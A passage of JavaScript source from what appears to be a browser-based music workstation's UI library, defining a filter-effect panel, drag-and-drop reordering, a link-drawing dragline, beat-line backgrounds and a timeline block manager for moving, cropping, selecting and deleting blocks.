		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" },
			GSUI.getTemplate( "gsui-fx-filter-type", "lowpass",   "M 1 4 L 12 4 L 15 8" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "highpass",  "M 1 8 L 4 4 L 15 4" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "bandpass",  "M 1 8 L 8 4 L 15 8" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "lowshelf",  "M 1 8 L 4 8 L 6 4 L 15 4" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "highshelf", "M 1 4 L 10 4 L 12 8 L 15 8" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "peaking",   "M 1 8 L 7 8 L 8 4 L 9 8 L 15 8" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "notch",     "M 1 4 L 7 4 L 8 8 L 9 4 L 15 4" ),
			GSUI.getTemplate( "gsui-fx-filter-type", "allpass",   "M 1 6 L 15 6" ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaGraph" },
		GSUI.createElement( "span", { class: "gsuiFxFilter-area-label" }, "frequency" ),
		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" } ),
	),
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaFrequency" },
		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" },
			GSUI.createElement( "gsui-slider", { type: "linear-x", min: 0, max: 1, step: .0001 } ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaGain" },
		GSUI.createElement( "span", { class: "gsuiFxFilter-area-label" }, "gain" ),
		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" },
			GSUI.createElement( "gsui-slider", { type: "linear-y", min: -50, max: 50, step: .1, "mousemove-size": 400 } ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaQ" },
		GSUI.createElement( "span", { class: "gsuiFxFilter-area-label" }, "Q" ),
		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" },
			GSUI.createElement( "gsui-slider", { type: "circular", min: .001, max: 25, step: .001, "mousemove-size": 400 } ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiFxFilter-area gsuiFxFilter-areaDetune" },
		GSUI.createElement( "span", { class: "gsuiFxFilter-area-label" }, "detune" ),
		GSUI.createElement( "div", { class: "gsuiFxFilter-area-content" },
			GSUI.createElement( "gsui-slider", { type: "circular", min: -1200, max: 1200, step: 10, "mousemove-size": 400 } ),
		),
	),
] );

GSUI.setTemplate( "gsui-fx-filter-type", ( type, d ) => (
	GSUI.createElement( "button", { class: "gsuiFxFilter-areaType-btn", "data-type": type, title: type },
		GSUI.createElementNS( "svg", { viewBox: "0 0 16 12" },
			GSUI.createElementNS( "path", { d } ),
		),
	)
) );

class gsuiFxFilter extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-fx-filter" ),
			elType = children[ 0 ].querySelector( ".gsuiFxFilter-area-content" ),
			elGraph = children[ 1 ].querySelector( ".gsuiFxFilter-area-content" ),
			uiCurves = GSUI.createElement( "gsui-curves" ),
			uiSliders = new Map( [
				[ "Q", children[ 4 ].querySelector( "gsui-slider" ) ],
				[ "gain", children[ 3 ].querySelector( "gsui-slider" ) ],
				[ "detune", children[ 5 ].querySelector( "gsui-slider" ) ],
				[ "frequency", children[ 2 ].querySelector( "gsui-slider" ) ],
			] );

		super();
		this.askData = () => {};
		this._children = children;
		this._nyquist = 24000;
		this._uiCurves = uiCurves;
		this._uiSliders = uiSliders;
		this._elType = elType;
		this._attached = false;
		this._currType = "lowpass";
		this._onresize = this._onresize.bind( this );
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiFxFilter" );
		Object.seal( this );

		elType.onclick = this._onclickType.bind( this );
		elGraph.append( uiCurves );
		this._initSlider( "Q" );
		this._initSlider( "gain" );
		this._initSlider( "detune" );
		this._initSlider( "frequency", this._frequencyPow.bind( this ) );
	}

	// .........................................................................
	connectedCallback() {
		this._attached = true;
		if ( this._children ) {
			this.classList.add( "gsuiFxFilter" );
			this.append( ...this._children );
			this._children = null;
			this._onresize();
			this.updateWave();
		}
		GSUI.observeSizeOf( this, this._onresize );
	}
	disconnectedCallback() {
		this._attached = false;
		GSUI.unobserveSizeOf( this, this._onresize );
	}
	static get observedAttributes() {
		return [ "type", "frequency", "q", "gain", "detune" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "type": {
					const gainQ = gsuiFxFilter.typeGainQ[ val ];

					this._toggleTypeBtn( this._currType, false );
					this._toggleTypeBtn( val, true );
					this._currType = val;
					this._uiSliders.get( "Q" ).enable( gainQ.q );
					this._uiSliders.get( "gain" ).enable( gainQ.gain );
				} break;
				case "q":
					this._uiSliders.get( "Q" ).setValue( +val );
					break;
				case "gain":
				case "detune":
					this._uiSliders.get( prop ).setValue( +val );
					break;
				case "frequency":
					this._uiSliders.get( "frequency" ).setValue( ( Math.log2( val / this._nyquist ) + 11 ) / 11 );
					break;
			}
		}
	}

	// .........................................................................
	setNyquist( n ) {
		this._nyquist = n;
	}
	toggle( b ) {
		this.classList.toggle( "gsuiFxFilter-enable", b );
		setTimeout( () => this.updateWave(), 150 );
	}
	updateWave() {
		if ( this._attached ) {
			const curve = this.askData( "curve", this._uiCurves.getWidth() );

			if ( curve ) {
				this._uiCurves.setCurve( "0", curve );
			}
		}
	}

	// .........................................................................
	_frequencyPow( Hz ) {
		return this._nyquist * ( 2 ** ( Hz * 11 - 11 ) );
	}
	_initSlider( prop, fnValue = a => a ) {
		const slider = this._uiSliders.get( prop );

		slider.oninput = val => this._oninputProp( prop, fnValue( val ) );
		slider.onchange = val => this._dispatch( "changeProp", prop, fnValue( val ) );
	}
	_toggleTypeBtn( type, b ) {
		this._elType.querySelector( `[data-type="${ type }"]` )
			.classList.toggle( "gsuiFxFilter-areaType-btnSelected", b );
	}

	// events
	// .........................................................................
	_onresize() {
		this._uiCurves.resized();
	}
	_oninputProp( prop, val ) {
		this._dispatch( "liveChange", prop, val );
		this.updateWave();
	}
	_onclickType( e ) {
		const type = e.target.dataset.type;

		if ( type && !e.target.classList.contains( "gsuiFxFilter-areaType-btnSelected" ) ) {
			this._dispatch( "changeProp", "type", type );
		}
	}
}

gsuiFxFilter.typeGainQ = GSUtils.deepFreeze( {
	lowpass:   { gain: false, q: true },
	highpass:  { gain: false, q: true },
	bandpass:  { gain: false, q: true },
	lowshelf:  { gain: true,  q: false },
	highshelf: { gain: true,  q: false },
	peaking:   { gain: true,  q: true },
	notch:     { gain: false, q: true },
	allpass:   { gain: false, q: true },
} );

customElements.define( "gsui-fx-filter", gsuiFxFilter );

if ( typeof gsuiEffects !== "undefined" ) {
	gsuiEffects.fxsMap.set( "filter", { cmp: gsuiFxFilter, name: "Filter", height: 160 } );
}

class gsuiReorder {
	constructor( opt = {} ) {
		const root = opt.rootElement;

		this.rootElement = root;
		this._dirRow = opt.direction !== "column";
		this._onchange = opt.onchange ?? ( () => console.warn( "gsuiReorder: no onchange set" ) );
		this._dataTransfer = opt.dataTransfer ?? ( () => "" );
		this._dataTransferType = opt.dataTransferType ?? "text";
		this._itemSelector = opt.itemSelector ?? "";
		this._handleSelector = opt.handleSelector ?? "";
		this._parentSelector = opt.parentSelector ?? "";
		this._preventDefault = opt.preventDefault ?? true;
		this._elClicked =
		this._elDragged =
		this._elDragover =
		this._itemDragover =
		this._parentDragover =
		this._elShadowParent =
		this._elShadowDragged =
		this._elDraggedParent = null;
		this._shadowClass = "";
		this._indDragged = 0;
		this._droppedInside = false;
		this._ondrop = this._ondrop.bind( this );
		this._dragoverTime = 0;
		Object.seal( this );

		root.addEventListener( "mousedown", this._onmousedown.bind( this ), { passive: true } );
		root.addEventListener( "dragstart", this._ondragstart.bind( this ), { passive: false } );
		root.addEventListener( "dragover", this._ondragover.bind( this ), { passive: true } );
		root.addEventListener( "dragend", this._ondragend.bind( this ), { passive: true } );
	}

	setShadowElement( el ) {
		this._elShadowParent = el;
	}
	setShadowChildClass( cl ) {
		this._shadowClass = `.${ cl }`;
	}

	// private:
	// .........................................................................
	_getIndex( el ) {
		return Array.prototype.indexOf.call( el.parentNode.children, el );
	}
	_getShadowChild( id ) {
		return this._elShadowParent.querySelector( `${ this._shadowClass }[data-id="${ id }"]` );
	}

	// events:
	// .........................................................................
	_onmousedown( e ) {
		this._elClicked = e.target;
	}
	_ondragstart( e ) {
		if ( this._elClicked && this._elClicked.matches( this._handleSelector ) ) {
			const elItem = e.target,
				itemId = elItem.dataset.id;

			document.addEventListener( "drop", this._ondrop );
			this._elClicked = null;
			this._elDragged = elItem;
			this._elDraggedParent = elItem.parentNode;
			if ( this._elShadowParent ) {
				this._elShadowDragged = this._getShadowChild( itemId );
			}
			this._indDragged = this._getIndex( elItem );
			e.dataTransfer.effectAllowed = "move";
			e.dataTransfer.setData( this._dataTransferType, this._dataTransfer( elItem ) );
			setTimeout( () => {
				this._elDragged.classList.add( "gsuiReorder-dragging" );
				if ( this._elShadowDragged ) {
					this._elShadowDragged.classList.add( "gsuiReorder-dragging" );
				}
			}, 20 );
		} else if ( this._preventDefault ) {
			e.preventDefault();
		}
	}
	_ondragover( e ) {
		const now = Date.now();

		if ( this._elDragged && now - this._dragoverTime > 60 ) {
			const tar = e.target,
				elDrag = this._elDragged,
				elOver = tar === this._elDragover
					? this._itemDragover
					: tar.closest( `${ this._parentSelector } ${ this._itemSelector }` );

			this._dragoverTime = now;
			if ( !elOver ) {
				const elOver = tar === this._elDragover
						? this._parentDragover
						: tar.closest( this._parentSelector );

				this._parentDragover = elOver;
				if ( elOver && elOver.lastElementChild !== elDrag ) {
					elOver.append( elDrag );
					if ( this._elShadowDragged ) {
						this._elShadowParent.append( this._elShadowDragged );
					}
				}
			} else {
				const bcr = elOver.getBoundingClientRect();

				if ( ( this._dirRow && e.clientX < bcr.left + bcr.width / 2 ) ||
					( !this._dirRow && e.clientY < bcr.top + bcr.height / 2 )
				) {
					if ( elOver.previousElementSibling !== elDrag ) {
						elOver.before( elDrag );
						if ( this._elShadowDragged ) {
							this._getShadowChild( elOver.dataset.id ).before( this._elShadowDragged );
						}
					}
				} else if ( elOver.nextElementSibling !== elDrag ) {
					elOver.after( elDrag );
					if ( this._elShadowDragged ) {
						this._getShadowChild( elOver.dataset.id ).after( this._elShadowDragged );
					}
				}
			}
			this._elDragover = tar;
			this._itemDragover = elOver;
		}
	}
	_ondrop( e ) {
		this._droppedInside = this._elDragged && e.target.closest( this._parentSelector );
	}
	_ondragend() {
		if ( this._elDragged ) {
			const el = this._elDragged,
				oldInd = this._indDragged,
				oldPar = this._elDraggedParent;

			this._elDragged =
			this._elDragover =
			this._itemDragover = null;
			el.classList.remove( "gsuiReorder-dragging" );
			if ( this._elShadowDragged ) {
				this._elShadowDragged.classList.remove( "gsuiReorder-dragging" );
			}
			document.removeEventListener( "drop", this._ondrop );
			if ( this._droppedInside ) {
				const ind = this._getIndex( el );

				this._droppedInside = false;
				if ( ind !== oldInd || el.parentNode !== oldPar ) {
					this._onchange( el, oldInd, ind, oldPar, el.parentNode );
				}
			} else {
				el.remove();
				oldInd === 0
					? oldPar.prepend( el )
					: oldPar.children[ oldInd - 1 ].after( el );
			}
		}
	}
}

gsuiReorder.listReorder = ( list, optObj ) => {
	const toSort = !optObj || Object.values( optObj ).some( obj => obj && "order" in obj );

	if ( toSort ) {
		const arr = Array.prototype
				.filter.call( list.children, el => "order" in el.dataset )
				.sort( ( a, b ) => a.dataset.order - b.dataset.order );

		list.append( ...arr );
	}
};

gsuiReorder.listComputeOrderChange = ( list, obj ) => {
	let i = 0;

	Array.prototype.forEach.call( list.children, el => {
		const dt = el.dataset;

		if ( "id" in dt && "order" in dt ) {
			if ( +dt.order !== i ) {
				const objId = obj[ dt.id ];

				if ( objId ) {
					objId.order = i;
				} else if ( !( dt.id in obj ) ) {
					obj[ dt.id ] = { order: i };
				}
			}
			++i;
		}
	} );
	return obj;
};

GSUI.setTemplate( "gsui-dragline", () => (
	GSUI.createElement( "div", { class: "gsuiDragline" },
		GSUI.createElement( "div", { class: "gsuiDragline-main" },
			GSUI.createElementNS( "svg", { class: "gsuiDragline-line" },
				GSUI.createElementNS( "polyline" ),
			),
			GSUI.createElement( "div", { class: "gsuiDragline-to" } ),
		),
	)
) );

class gsuiDragline {
	constructor() {
		const root = GSUI.getTemplate( "gsui-dragline" ),
			svg = root.firstElementChild.firstElementChild;

		this.onchange = () => {};
		this.rootElement = root;
		this.getDropAreas =
		this._linkedTo =
		this._dropAreas =
		this._evKeydown =
		this._evMouseup =
		this._evMousemove = null;
		this._dragging = false;
		this._lineSize = 0;
		this._svg = svg;
		this._to = root.firstElementChild.lastElementChild;
		this._main = root.firstElementChild;
		this._polyline = svg.firstElementChild;
		Object.seal( this );

		this._to.onmousedown = this._mousedownTo.bind( this );
	}

	linkTo( el ) {
		const elem = el || null;

		if ( elem !== this._linkedTo ) {
			this._linkedTo = elem;
			this.rootElement.classList.toggle( "gsuiDragline-linked", !!elem );
			elem ? this.redraw() : this._unlink();
		}
	}
	redraw() {
		if ( this._linkedTo ) {
			const bcr = this._linkedTo.getBoundingClientRect();

			this._updateLineSize();
			this._render( bcr.left, bcr.top );
		}
	}

	// private:
	_updateLineSize() {
		this._lineSize = parseFloat( getComputedStyle( this._polyline ).strokeWidth ) || 0;
	}
	_render( x, y ) {
		const clMain = this._main.classList,
			stMain = this._main.style,
			stSvg = this._svg.style,
			bcr = this.rootElement.getBoundingClientRect(),
			w = x - bcr.left,
			h = y - bcr.top,
			wabs = Math.abs( w ),
			habs = Math.abs( h ),
			whmax = Math.max( wabs, habs ),
			whmax2 = whmax * 2;

		clMain.toggle( "gsuiDragline-down", h > 0 );
		clMain.toggle( "gsuiDragline-right", w > 0 );
		stMain.top = `${ Math.min( h, 0 ) }px`;
		stMain.left = `${ Math.min( w, 0 ) }px`;
		stMain.width = `${ wabs }px`;
		stMain.height = `${ habs }px`;
		stSvg.width =
		stSvg.height = `${ whmax2 }px`;
		stSvg.margin = `${ -whmax }px`;
		this._svg.setAttribute( "viewBox", `0 0 ${ whmax2 } ${ whmax2 }` );
		this._polyline.setAttribute( "points", `${ whmax },${ whmax } ${ whmax + w },${ whmax + h }` );
	}
	_unlink() {
		const stMain = this._main.style,
			stSvg = this._svg.style;

		stMain.top =
		stMain.left =
		stMain.width =
		stMain.height =
		stSvg.width =
		stSvg.height =
		stSvg.margin = "0px";
	}
	_cancelDrag() {
		this._resetDrag();
		if ( this._linkedTo ) {
			this.redraw();
		} else {
			this._unlink();
		}
	}
	_resetDrag() {
		this.rootElement.classList.remove( "gsuiDragline-dragging" );
		this._dropAreas.forEach( el => {
			el.classList.remove( "gsuiDragline-dropActive" );
			delete el.onmouseup;
		} );
		this._dragging = false;
		document.removeEventListener( "mousemove", this._evMousemove );
		document.removeEventListener( "mouseup", this._evMouseup );
		document.removeEventListener( "keydown", this._evKeydown );
	}

	// events:
	_mousedownTo( e ) {
		if ( e.button === 0 ) {
			this._dragging = true;
			this._dropAreas = this.getDropAreas();
			this._dropAreas.forEach( el => {
				el.onmouseup = this._mouseupDrop.bind( this );
				el.classList.add( "gsuiDragline-dropActive" );
			} );
			this.rootElement.classList.add( "gsuiDragline-dragging" );
			this._evMousemove = this._mousemove.bind( this );
			this._evMouseup = this._mouseup.bind( this );
			this._evKeydown = this._keydown.bind( this );
			document.addEventListener( "mousemove", this._evMousemove );
			document.addEventListener( "mouseup", this._evMouseup );
			document.addEventListener( "keydown", this._evKeydown );
			this._updateLineSize();
			this._mousemove( e );
		}
	}
	_keydown( e ) {
		if ( e.key === "Escape" ) {
			this._cancelDrag();
		}
	}
	_mouseupDrop( e ) {
		const tar = e.currentTarget;

		if ( tar !== this._linkedTo ) {
			this.onchange( tar, this._linkedTo );
			this._linkedTo = tar;
		}
		this._resetDrag();
		this.redraw();
		return false;
	}
	_mouseup() {
		if ( this._linkedTo ) {
			this.onchange( null, this._linkedTo );
			this._linkedTo = null;
		}
		this._cancelDrag();
	}
	_mousemove( e ) {
		this._render( e.pageX, e.pageY );
	}
}

class gsuiBeatlines extends HTMLElement {
	connectedCallback() {
		this.classList.add( "gsuiBeatlines" );
	}
	static get observedAttributes() {
		return [ "timesignature", "pxperbeat", "coloredbeats" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "coloredbeats":
				case "timesignature":
					this.style.backgroundImage = gsuiBeatlines._background(
						...( this.getAttribute( "timesignature" ) || "4,4" ).split( "," ),
						this.hasAttribute( "coloredbeats" ) );
					break;
				case "pxperbeat":
					this.style.fontSize = `${ val }px`;
					this.style.opacity = Math.min( val / 48, 1 );
					break;
			}
		}
	}

	// .........................................................................
	static _background( bPM, sPB, colored ) {
		return `
			${ gsuiBeatlines._repeat( ".5px", "rgba(0,0,0,.15)", 1 / sPB ) },
			${ gsuiBeatlines._repeat( ".5px", "rgba(0,0,0,.25)", 1 ) },
			${ gsuiBeatlines._repeat( "1px", "rgba(0,0,0,.5)", bPM ) }
			${ colored
				? ",repeating-linear-gradient(90deg, rgba(0,0,0,.08), rgba(0,0,0,.08) 1em, transparent 1em, transparent 2em)"
				: "" }
		`;
	}
	static _repeat( w, col, em ) {
		return `repeating-linear-gradient(90deg, ${ col }, ${ col } ${ w }, transparent ${ w }, transparent calc(${ em }em - ${ w }), ${ col } calc(${ em }em - ${ w }), ${ col } ${ em }em)`;
	}
}

customElements.define( "gsui-beatlines", gsuiBeatlines );

class gsuiBlocksManager {
	constructor( opts ) {
		const root = opts.rootElement;

		this.rootElement = root;
		this.timeline = opts.timeline;
		this._opts = opts;
		this._opts.oneditBlock = opts.oneditBlock || GSUI.noop;
		this._blockDOMChange = opts.blockDOMChange;
		this.__fontSize =
		this.__pxPerBeat = 10;
		this.__blcs = new Map();
		this.__blcsEditing = new Map();
		this.__blcsSelected = new Map();
		this.__selection = opts.selectionElement;
		this.__rows = root.getElementsByClassName( "gsui-row" );

		root.onkeydown = this.__keydown.bind( this );
		this.__eventReset();
	}

	// ............................................................................................
	__getRow0BCR() { return this.__rows[ 0 ].getBoundingClientRect(); }
	__getRowByIndex( ind ) { return this.__rows[ ind ]; }
	__getRowIndexByRow( row ) { return Array.prototype.indexOf.call( this.__rows, row ); }
	__getRowIndexByPageY( pageY ) {
		const ind = Math.floor( ( pageY - this.__getRow0BCR().top ) / this.__fontSize );

		return Math.max( 0, Math.min( ind, this.__rows.length - 1 ) );
	}
	__getWhenByPageX( pageX ) {
		return Math.max( 0, ( pageX - this.__getRow0BCR().left ) / this.__pxPerBeat );
	}
	__roundBeat( beat ) {
		return Math.max( 0, this.timeline.beatFloor( beat ) );
	}

	// ............................................................................................
	__isBlc( el ) {
		return el.classList.contains( "gsuiBlocksManager-block" );
	}
	__getBlc( el ) {
		if ( this.__isBlc( el ) ) {
			return el;
		} else if ( this.__isBlc( el.parentNode ) ) {
			return el.parentNode;
		} else if ( this.__isBlc( el.parentNode.parentNode ) ) {
			return el.parentNode.parentNode;
		}
	}
	__fillBlcsMap( blc ) {
		const blcs = this.__blcsEditing;

		if ( blc.classList.contains( "gsuiBlocksManager-block-selected" ) ) {
			this.__blcsSelected.forEach( ( blc, id ) => blcs.set( id, blc ) );
		} else {
			blcs.set( blc.dataset.id, blc );
		}
		return blcs;
	}
	__unselectBlocks( obj ) {
		const dat = this._opts.getData();

		this.__blcsSelected.forEach( ( blc, id ) => {
			if ( !( id in obj ) ) {
				dat[ id ].selected = false;
				obj[ id ] = { selected: false };
			}
		} );
		return obj;
	}
	__getBeatSnap() {
		return 1 / this.timeline.stepsPerBeat * this.timeline.getAttribute( "step" );
	}
	__eventReset() {
		this.__mmFn =
		this.__valueA =
		this.__valueB = null;
		this.__valueAMin =
		this.__valueBMin = Infinity;
		this.__valueAMax =
		this.__valueBMax = -Infinity;
		this.__status = "";
		this.__blcsEditing.clear();
	}

	// ............................................................................................
	__keydown( e ) {
		const dat = this._opts.getData(),
			blcsEditing = this.__blcsEditing;

		switch ( e.key ) {
			case "Delete":
				if ( this.__blcsSelected.size ) {
					this.__blcsSelected.forEach( ( blc, id ) => blcsEditing.set( id, blc ) );
					this.__status = "deleting";
					this.__mouseup();
				}
				break;
			case "b": // copy paste
				if ( e.ctrlKey || e.altKey ) {
					if ( this.__blcsSelected.size ) {
						const data = this._opts.getData();
						let whenMin = Infinity,
							whenMax = 0;

						blcsEditing.clear();
						this.__blcsSelected.forEach( ( blc, id ) => {
							const dat = data[ id ];

							whenMin = Math.min( whenMin, dat.when );
							whenMax = Math.max( whenMax, dat.when + dat.duration );
							blcsEditing.set( id, blc );
						} );
						whenMax = this.timeline.beatCeil( whenMax ) - whenMin;
						this._opts.managercallDuplicating( blcsEditing, whenMax );
						blcsEditing.clear();
					}
					e.preventDefault();
					e.stopPropagation();
				}
				break;
			case "a": // select all
			case "d": // deselect
				if ( e.ctrlKey || e.altKey ) {
					if ( e.key === "d" ) {
						if ( this.__blcsSelected.size > 0 ) {
							this._opts.managercallUnselecting();
						}
					} else if ( this.__blcs.size > this.__blcsSelected.size ) {
						const ids = [];

						this.__blcs.forEach( ( blc, id ) => {
							if ( !dat[ id ].selected ) {
								ids.push( id );
							}
						} );
						this._opts.managercallSelecting( ids );
					}
					e.preventDefault();
					e.stopPropagation();
				}
				break;
		}
	}
}

document.addEventListener( "mousemove", e => {
	if ( gsuiBlocksManager._focused ) {
		gsuiBlocksManager._focused.__mousemove( e );
	}
} );
document.addEventListener( "mouseup", e => {
	if ( gsuiBlocksManager._focused ) {
		if ( gsuiBlocksManager._focused._opts.mouseup ) {
			gsuiBlocksManager._focused._opts.mouseup( e );
		}
		gsuiBlocksManager._focused.__mouseup( e );
	}
} );

gsuiBlocksManager.prototype.__mousedown = function( e ) {
	if ( !gsuiBlocksManager._focused ) {
		const blc = this.__getBlc( e.currentTarget );

		gsuiBlocksManager._focused = this;
		window.getSelection().removeAllRanges();
		this.__mdBlc = blc;
		this.__mdTarget = e.target;
		if ( e.button === 2 ) {
			this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "deletion" );
			this.__status = "deleting";
			if ( blc ) {
				this._blockDOMChange( blc, "deleted", true );
				this.__blcsEditing.set( blc.dataset.id, blc );
			}
		} else if ( e.button === 0 ) {
			this.__mdPageX = e.pageX;
			this.__mdPageY = e.pageY;
			this.__mdWhenReal = this.__getWhenByPageX( e.pageX );
			this.__mdWhen = this.__roundBeat( this.__mdWhenReal );
			this.__beatSnap = this.__getBeatSnap();
			if ( e.shiftKey ) {
				this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "selection1" );
				this.__status = "selecting-1";
				this.__mdRowInd = this.__getRowIndexByPageY( e.pageY );
			} else if ( blc ) {
				const fnAct = gsuiBlocksManager.__mousedownFns.get( e.target.dataset.action );

				if ( fnAct ) {
					const data = this._opts.getData(),
						blcsEditing = this.__fillBlcsMap( blc );

					blc.classList.add( "gsui-hover" );
					e.target.classList.add( "gsui-hover" );
					fnAct.call( this, data, blcsEditing, blc, e );
				}
			}
		}
	}
};

gsuiBlocksManager.__mousedownFns = new Map( [
	[ "move", function( data, blcsEditing, _blc, e ) {
		this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "move" );
		this.__status = "moving";
		this.__mdRowInd = this.__getRowIndexByPageY( e.pageY );
		blcsEditing.forEach( ( blc, id ) => {
			const valB = this.__getRowIndexByRow( blc.parentNode.parentNode );

			this.__valueAMin = Math.min( this.__valueAMin, data[ id ].when );
			this.__valueBMin = Math.min( this.__valueBMin, valB );
			this.__valueBMax = Math.max( this.__valueBMax, valB );
		} );
		this.__valueAMin *= -1;
		this.__valueBMin *= -1;
		this.__valueBMax = this.__rows.length - 1 - this.__valueBMax;
	} ],
	[ "attack", function( data, blcsEditing ) {
		this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "attack" );
		this.__status = "attack";
		this.__valueAMin =
		this.__valueAMax = Infinity;
		blcsEditing.forEach( ( blc, id ) => {
			const dat = data[ id ];

			this.__valueAMin = Math.min( this.__valueAMin, dat.attack );
			this.__valueAMax = Math.min( this.__valueAMax, dat.duration - dat.attack - dat.release );
		} );
		this.__valueAMin *= -1;
		this.__valueAMax = Math.max( 0, this.__valueAMax );
	} ],
	[ "release", function( data, blcsEditing ) {
		this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "release" );
		this.__status = "release";
		this.__valueAMin =
		this.__valueAMax = Infinity;
		blcsEditing.forEach( ( blc, id ) => {
			const dat = data[ id ];

			this.__valueAMin = Math.min( this.__valueAMin, dat.release );
			this.__valueAMax = Math.min( this.__valueAMax, dat.duration - dat.attack - dat.release );
		} );
		this.__valueAMin *= -1;
		this.__valueAMax = Math.max( 0, this.__valueAMax );
	} ],
	[ "cropA", function( data, blcsEditing ) {
		this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "crop" );
		this.__status = "cropping-a";
		this.__valueAMin =
		this.__valueAMax = Infinity;
		blcsEditing.forEach( ( blc, id ) => {
			const dat = data[ id ];

			this.__valueAMin = Math.min( this.__valueAMin, dat.offset );
			this.__valueAMax = Math.min( this.__valueAMax, dat.duration );
		} );
		this.__valueAMin *= -1;
		this.__valueAMax = Math.max( 0, this.__valueAMax - this.__beatSnap );
	} ],
	[ "cropB", function( data, blcsEditing ) {
		this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "crop" );
		this.__status = "cropping-b";
		this.__valueAMin =
		this.__valueAMax = Infinity;
		blcsEditing.forEach( ( blc, id ) => {
			this.__valueAMin = Math.min( this.__valueAMin, data[ id ].duration );
		} );
		this.__valueAMin = -Math.max( 0, this.__valueAMin - this.__beatSnap );
	} ],
] );

gsuiBlocksManager.prototype.__mousemove = function( e ) {
	if ( this.__mmFn ) {
		if ( e.type === "mousemove" ) {
			this.__mmPageX = e.pageX;
			this.__mmPageY = e.pageY;
		}
		this.__mmWhenReal = this.__getWhenByPageX( this.__mmPageX );
		this.__mmWhen = this.__roundBeat( this.__mmWhenReal );
		this.__mmFn( e );
	}
};

gsuiBlocksManager.__mousemoveFns = new Map( [
	[ "crop", function() {
		const croppingB = this.__status === "cropping-b",
			cropBrut = this.__beatSnap * Math.round( ( this.__mmWhen - this.__mdWhen ) / this.__beatSnap ),
			crop = Math.max( this.__valueAMin, Math.min( cropBrut, this.__valueAMax ) );

		if ( crop !== this.__valueA ) {
			const data = this._opts.getData();

			this.__valueA = crop;
			this.__blcsEditing.forEach( ( blc, id ) => {
				const blcObj = { ...data[ id ] };

				if ( croppingB ) {
					blcObj.duration += crop;
				} else {
					blcObj.when += crop;
					blcObj.offset += crop;
					blcObj.duration -= crop;
					this._blockDOMChange( blc, "when", blcObj.when );
				}
				this._blockDOMChange( blc, "duration", blcObj.duration );
				this._opts.oneditBlock( id, blcObj, blc );
			} );
		}
	} ],
	[ "move", function() {
		const data = this._opts.getData(),
			when = Math.max( this.__valueAMin,
				Math.round( ( this.__mmWhen - this.__mdWhen ) / this.__beatSnap ) * this.__beatSnap ),
			rows = Math.max( this.__valueBMin, Math.min( this.__valueBMax,
				this.__getRowIndexByPageY( this.__mmPageY ) - this.__mdRowInd ) );

		if ( when !== this.__valueA ) {
			this.__valueA = when;
			this.__blcsEditing.forEach( ( blc, id ) => this._blockDOMChange( blc, "when", data[ id ].when + when ) );
		}
		if ( rows !== this.__valueB ) {
			this.__valueB = rows;
			this.__blcsEditing.forEach( blc => this._blockDOMChange( blc, "row", rows ) );
		}
	} ],
	[ "attack", function() {
		const valBrut = this.__mmWhenReal - this.__mdWhenReal,
			val = Math.max( this.__valueAMin, Math.min( valBrut, this.__valueAMax ) );

		if ( val !== this.__valueA ) {
			const data = this._opts.getData();

			this.__valueA = val;
			this.__blcsEditing.forEach( ( blc, id ) => {
				const blcObj = { ...data[ id ] };

				blcObj.attack += val;
				this._blockDOMChange( blc, "attack", blcObj.attack );
				this._opts.oneditBlock( id, blcObj, blc );
			} );
		}
	} ],
	[ "release", function() {
		const valBrut = this.__mdWhenReal - this.__mmWhenReal,
			val = Math.max( this.__valueAMin, Math.min( valBrut, this.__valueAMax ) );

		if ( val !== this.__valueA ) {
			const data = this._opts.getData();

			this.__valueA = val;
			this.__blcsEditing.forEach( ( blc, id ) => {
				const blcObj = { ...data[ id ] };

				blcObj.release += val;
				this._blockDOMChange( blc, "release", blcObj.release );
				this._opts.oneditBlock( id, blcObj, blc );
			} );
		}
	} ],
	[ "deletion", function( e ) {
		const blc = this.__getBlc( e.target );

		if ( blc && !this.__blcsEditing.has( blc.dataset.id ) ) {
			this._blockDOMChange( blc, "deleted", true );
			this.__blcsEditing.set( blc.dataset.id, blc );
		}
	} ],
	[ "selection1", function() {
		if ( Math.abs( this.__mmPageX - this.__mdPageX ) > 6 ||
			Math.abs( this.__mmPageY - this.__mdPageY ) > 6
		) {
			this.__status = "selecting-2";
			this.__selection.classList.remove( "gsuiBlocksManager-selection-hidden" );
			this.__mmFn = gsuiBlocksManager.__mousemoveFns.get( "selection2" );
			this.__mmFn();
		}
	} ],
	[ "selection2", function() {
		const rowH = this.__fontSize,
			st = this.__selection.style,
			rowIndB = this.__getRowIndexByPageY( this.__mmPageY ),
			when = Math.min( this.__mdWhen, this.__mmWhen ),
			duration = this.__getBeatSnap() + Math.abs( this.__mdWhen - this.__mmWhen ),
			topRow = Math.min( this.__mdRowInd, rowIndB ),
			bottomRow = Math.max( this.__mdRowInd, rowIndB ),
			rowA = this.__getRowByIndex( topRow ),
			rowB = this.__getRowByIndex( bottomRow ),
			blcs = Object.entries( this._opts.getData() )
